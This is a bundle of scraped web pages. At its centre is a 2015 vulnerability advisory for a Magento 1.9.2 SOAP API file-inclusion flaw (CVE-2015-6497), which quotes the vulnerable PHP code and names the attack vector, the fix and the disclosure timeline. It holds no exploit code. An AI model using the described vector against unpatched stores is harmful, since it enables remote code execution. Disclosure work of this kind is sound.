* [screenshot security](https://blog.mindedsecurity.com/search/label/screenshot%20security)
  (
  2
  )
* [SDL](https://blog.mindedsecurity.com/search/label/SDL)
  (
  2
  )
* [security](https://blog.mindedsecurity.com/search/label/security)
  (
  2
  )
* [security tools](https://blog.mindedsecurity.com/search/label/security%20tools)
  (
  1
  )
* [semgrep](https://blog.mindedsecurity.com/search/label/semgrep)
  (
  3
  )
* [Sharepoint](https://blog.mindedsecurity.com/search/label/Sharepoint)
  (
  1
  )
* [slack](https://blog.mindedsecurity.com/search/label/slack)
  (
  1
  )
* [Software Security Governance](https://blog.mindedsecurity.com/search/label/Software%20Security%20Governance)
  (
  1
  )
* [source code](https://blog.mindedsecurity.com/search/label/source%20code)
  (
  1
  )
* [Spring MVC](https://blog.mindedsecurity.com/search/label/Spring%20MVC)
  (
  1
  )
* [SQL Injection](https://blog.mindedsecurity.com/search/label/SQL%20Injection)
  (
  1
  )
* [SSL](https://blog.mindedsecurity.com/search/label/SSL)
  (
  2
  )
* [static analysis](https://blog.mindedsecurity.com/search/label/static%20analysis)
  (
  1
  )
* [Stored DOM Based XSS](https://blog.mindedsecurity.com/search/label/Stored%20DOM%20Based%20XSS)
  (
  1
  )
* [STRATEGY](https://blog.mindedsecurity.com/search/label/STRATEGY)
  (
  1
  )
* [superfish](https://blog.mindedsecurity.com/search/label/superfish)
  (
  1
  )
* [Supply Chain Security](https://blog.mindedsecurity.com/search/label/Supply%20Chain%20Security)
  (
  1
  )
* [SVG](https://blog.mindedsecurity.com/search/label/SVG)
  (
  1
  )
* [Swift](https://blog.mindedsecurity.com/search/label/Swift)
  (
  1
  )
* [TARA](https://blog.mindedsecurity.com/search/label/TARA)
  (
  1
  )
* [Telerik UI](https://blog.mindedsecurity.com/search/label/Telerik%20UI)
  (
  1
  )
* [TESTABLE](https://blog.mindedsecurity.com/search/label/TESTABLE)
  (
  1
  )
* [testing](https://blog.mindedsecurity.com/search/label/testing)
  (
  1
  )
* [Threat Modeling](https://blog.mindedsecurity.com/search/label/Threat%20Modeling)
  (
  1
  )
* [twitter](https://blog.mindedsecurity.com/search/label/twitter)
  (
  1
  )
* [UNECE R155](https://blog.mindedsecurity.com/search/label/UNECE%20R155)
  (
  1
  )
* [unzip directory traversal](https://blog.mindedsecurity.com/search/label/unzip%20directory%20traversal)
  (
  1
  )
* [UPnP](https://blog.mindedsecurity.com/search/label/UPnP)
  (
  2
  )
* [validation](https://blog.mindedsecurity.com/search/label/validation)
  (
  1
  )
* [Vulnerabilities statistics](https://blog.mindedsecurity.com/search/label/Vulnerabilities%20statistics)
  (
  1
  )
* [WAF](https://blog.mindedsecurity.com/search/label/WAF)
  (
  1
  )
* [WAPT](https://blog.mindedsecurity.com/search/label/WAPT)
  (
  1
  )
* [Web Application Firewall](https://blog.mindedsecurity.com/search/label/Web%20Application%20Firewall)
  (
  1
  )
* [web architecture security](https://blog.mindedsecurity.com/search/label/web%20architecture%20security)
  (
  1
  )
* [Web Attacks](https://blog.mindedsecurity.com/search/label/Web%20Attacks)
  (
  23
  )
* [web cache](https://blog.mindedsecurity.com/search/label/web%20cache)
  (
  1
  )
* [web injection](https://blog.mindedsecurity.com/search/label/web%20injection)
  (
  4
  )
* [Web Security](https://blog.mindedsecurity.com/search/label/Web%20Security)
  (
  23
  )
* [Windows Phone Security](https://blog.mindedsecurity.com/search/label/Windows%20Phone%20Security)
  (
  1
  )
* [WWeb Security](https://blog.mindedsecurity.com/search/label/WWeb%20Security)
  (
  2
  )
* [zeus p2p](https://blog.mindedsecurity.com/search/label/zeus%20p2p)
  (
  3
  )

## Blog Archive

* [May](https://blog.mindedsecurity.com/2024/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2024/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2024/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2023/10/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2023/06/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2023/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2023/02/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2022/07/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2021/12/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2021/08/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2021/05/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2021/02/)
  (
  1
  )
* [January](https://blog.mindedsecurity.com/2021/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2020/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2020/10/)
  (
  1
  )
* [July](https://blog.mindedsecurity.com/2020/07/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2020/06/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2020/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2020/04/)
  (
  1
  )
* [March](https://blog.mindedsecurity.com/2020/03/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2020/02/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2019/04/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2018/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2018/09/)
  (
  3
  )
* [July](https://blog.mindedsecurity.com/2018/07/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2018/05/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2018/04/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2017/11/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2017/06/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2016/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2016/01/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2015/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2015/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2015/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2015/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2015/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2015/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2015/03/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2015/02/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2014/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2014/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2014/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2013/10/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2013/04/)
  (
  1
  )
* [February](https://blog.mindedsecurity.com/2013/02/)
  (
  2
  )
* [November](https://blog.mindedsecurity.com/2012/11/)
  (
  2
  )
* [October](https://blog.mindedsecurity.com/2012/10/)
  (
  3
  )
* [September](https://blog.mindedsecurity.com/2012/09/)
  (
  4
  )
* [June](https://blog.mindedsecurity.com/2012/06/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2011/10/)
  (
  1
  )
* [September](https://blog.mindedsecurity.com/2011/09/)
  (
  1
  )
* [August](https://blog.mindedsecurity.com/2011/08/)
  (
  2
  )
* [July](https://blog.mindedsecurity.com/2011/07/)
  (
  2
  )
* [May](https://blog.mindedsecurity.com/2011/05/)
  (
  2
  )
* [April](https://blog.mindedsecurity.com/2011/04/)
  (
  2
  )
* [March](https://blog.mindedsecurity.com/2011/03/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2010/10/)
  (
  8
  )
* [September](https://blog.mindedsecurity.com/2010/09/)
  (
  3
  )
* [August](https://blog.mindedsecurity.com/2010/08/)
  (
  1
  )
* [June](https://blog.mindedsecurity.com/2010/06/)
  (
  1
  )
* [April](https://blog.mindedsecurity.com/2010/04/)
  (
  4
  )
* [March](https://blog.mindedsecurity.com/2010/03/)
  (
  1
  )
* [December](https://blog.mindedsecurity.com/2009/12/)
  (
  1
  )
* [November](https://blog.mindedsecurity.com/2009/11/)
  (
  1
  )
* [October](https://blog.mindedsecurity.com/2009/10/)
  (
  1
  )
* [May](https://blog.mindedsecurity.com/2009/05/)
  (
  4
  )
* [February](https://blog.mindedsecurity.com/2009/02/)
  (
  2
  )
* [January](https://blog.mindedsecurity.com/2009/01/)
  (
  1
  )

####

Minded Security was established in Italy in 2007

with a focus on supporting businesses and

organizations to build secure products
 and services.

##### Services

* Training
* Testing
* Consulting
* Request a brochure

##### Information

* The Company
* blueclosure
* AMT – Banking Malware Detector
* Contact us
* Privacy Policy

##### Newsletter

©2015 Minded Security S.r.l. The Software Security Company - VAT IT05756380480

[Back to top](#top)



=== Content from karmainsecurity.com_403f457f_20250124_161722.html ===

[egix@karmainsecurity ~ $](https://karmainsecurity.com/)

* [~/research](https://karmainsecurity.com/research)
* [~/blog](https://karmainsecurity.com/blog)
* [~/about](https://karmainsecurity.com/about)

# Magento <= 1.9.2 (catalogProductCreate) Autoloaded File Inclusion Vulnerability

#### â¢ Software Link:

<http://magento.com>

#### â¢ Affected Versions:

Version 1.9.2 and prior versions.

#### â¢ Vulnerability Description:

The vulnerability is caused by the **“catalogProductCreate”** SOAP API implementation, which is defined into the **/app/code/core/Mage/Catalog/Model/Product/Api/V2.php** script:

```
109public function create($type, $set, $sku, $productData, $store = null)
110{
111    if (!$type || !$set || !$sku) {
112        $this->_fault('data_invalid');
113    }
114
115    $this->_checkProductTypeExists($type);
116    $this->_checkProductAttributeSet($set);
117
118    /** @var $product Mage_Catalog_Model_Product */
119    $product = Mage::getModel('catalog/product');
120    $product->setStoreId($this->_getStoreId($store))
121        ->setAttributeSetId($set)
122        ->setTypeId($type)
123        ->setSku($sku);
124
125    if (!property_exists($productData, 'stock_data')) {
126        //Set default stock_data if not exist in product data
127        $_stockData = array('use_config_manage_stock' => 0);
128        $product->setStockData($_stockData);
129    }
```

User input passed through the **“productData”** SOAP parameter is not properly validated before being used in a call to the `property_exists()` PHP function at line 125. This can be exploited by attackers with valid API credentials to include and execute arbitrary PHP code (both from local or remote resources) leveraging the `Varien_Autoload::autoload()` autoloading function. Successful exploitation of this vulnerability requires the application running on PHP before version 5.4.24 or 5.5.8.

#### â¢ Solution:

Update to version 1.9.2.1 or apply the SUPEE-6482 patch bundle.

#### â¢ Disclosure Timeline:

[27/02/2015] â Vendor notified

[25/06/2015] â Vendor acknowledgement stating the issue will be fixed in the next release

[04/08/2015] â Version 1.9.2.1 released along with the patch for this vulnerability

[13/08/2015] â CVE number requested

[17/08/2015] â CVE number assigned

[11/09/2015] â Public disclosure

#### â¢ CVE Reference:

The Common Vulnerabilities and Exposures project ([cve.mitre.org](http://cve.mitre.org)) has assigned the name [CVE-2015-6497](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6497) to this vulnerability.

#### â¢ Credits:

Vulnerability discovered by Egidio Romano.

Karma(In)Security © 2025



=== Content from seclists.org_30d93fb6_20250124_161726.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](47)
[By Date](date.html#48)
[![Next](/images/right-icon-16x16.png)](49)

[![Previous](/images/left-icon-16x16.png)](47)
[By Thread](index.html#48)
[![Next](/images/right-icon-16x16.png)](50)

![](/shared/images/nst-icons.svg#search)

# [KIS-2015-04] Magento <= 1.9.2 (catalogProductCreate) Autoloaded File Inclusion Vulnerability

---

*From*: Egidio Romano <research () karmainsecurity com>

*Date*: Fri, 11 Sep 2015 13:10:22 +0200

---

```
-------------------------------------------------------------------------------
Magento <= 1.9.2 (catalogProductCreate) Autoloaded File Inclusion Vulnerability
-------------------------------------------------------------------------------

[-] Software Link:

<http://magento.com/>

[-] Affected Versions:

Version 1.9.2 and prior versions.

[-] Vulnerability Description:

The vulnerability is caused by the "catalogProductCreate" SOAP API implementation,
which is defined into the /app/code/core/Mage/Catalog/Model/Product/Api/V2.php script:

109.    public function create($type, $set, $sku, $productData, $store = null)
110.    {
111.        if (!$type || !$set || !$sku) {
112.            $this->_fault('data_invalid');
113.        }
114.
115.        $this->_checkProductTypeExists($type);
116.        $this->_checkProductAttributeSet($set);
117.
118.        /** @var $product Mage_Catalog_Model_Product */
119.        $product = Mage::getModel('catalog/product');
120.        $product->setStoreId($this->_getStoreId($store))
121.            ->setAttributeSetId($set)
122.            ->setTypeId($type)
123.            ->setSku($sku);
124.
125.        if (!property_exists($productData, 'stock_data')) {
126.            //Set default stock_data if not exist in product data
127.            $_stockData = array('use_config_manage_stock' => 0);
128.            $product->setStockData($_stockData);
129.        }

User input passed through the "productData" SOAP parameter is not properly validated before being
used in a call to the "property_exists()" function at line 125. This can be exploited by attackers
with valid API credentials to include and execute arbitrary PHP code (both from local or remote
resources) leveraging the Varien_Autoload::autoload() autoloading function. Successful exploitation
of this vulnerability requires the application running on PHP before version 5.4.24 or 5.5.8.

[-] Solution:

Update to version 1.9.2.1 or apply the SUPEE-6482 patch bundle.

[-] Disclosure Timeline:

[27/02/2015] - Vendor notified
[25/06/2015] - Vendor acknowledgement stating the issue will be fixed in the next release
[04/08/2015] - Version 1.9.2.1 released along with the patch for this vulnerability
[13/08/2015] - CVE number requested
[17/08/2015] - CVE number assigned
[11/09/2015] - Public disclosure

[-] CVE Reference:

The Common Vulnerabilities and Exposures project (cve.mitre.org)
has assigned the name CVE-2015-6497 to this vulnerability.

[-] Credits:

Vulnerability discovered by Egidio Romano of Minded Security.

[-] Original Advisory:

<http://karmainsecurity.com/KIS-2015-04>

[-] Other References:

<http://blog.mindedsecurity.com/2015/09/autoloaded-file-inclusion-in-magento.html>

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](47)
[By Date](date.html#48)
[![Next](/images/right-icon-16x16.png)](49)

[![Previous](/images/left-icon-16x16.png)](47)
[By Thread](index.html#48)
[![Next](/images/right-icon-16x16.png)](50)

### Current thread:

* **[KIS-2015-04] Magento <= 1.9.2 (catalogProductCreate) Autoloaded File Inclusion Vulnerability** *Egidio Romano (Sep 11)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from magento.com_392ac8a0_20250124_161723.html ===


[Documentation](/en/docs/)[Commerce](/en/docs/commerce)[Release information](/en/docs/commerce-operations/release/notes/overview)

# Adobe Commerce release notes

Last update: Fri Sep 29 2023 00:00:00 GMT+0000 (Coordinated Universal Time)

* Topics:
* Release Notes

CREATED FOR:

* Experienced
* Admin
* Developer

Learn about the latest improvements in Adobe Commerce, including enhancements, security, bug fixes, and known issues.

NOTE

Although code for enhancements and bug fixes described in these release notes is bundled with Adobe Commerce, several of these projects (for example, B2B, Page Builder, and Progressive Web Applications (PWA) Studio) are also released independently. Bug fixes for these projects are documented in the separate, project-specific release information that is available in the documentation for each project. See [product release overview](/en/docs/commerce-operations/release/notes/overview).

NOTE

Adobe Commerce releases can contain backward-incompatible changes (BICs). To review backward-incompatible changes, see [BIC reference](https://developer.adobe.com/commerce/php/development/backward-incompatible-changes/reference/). Major backward-incompatible issues are described in [BIC highlights](https://developer.adobe.com/commerce/php/development/backward-incompatible-changes/highlights/). Not all releases introduce major BICs.

recommendation-more-help

1d4eef6c-fef1-4e61-85eb-b58d7b9ac29f


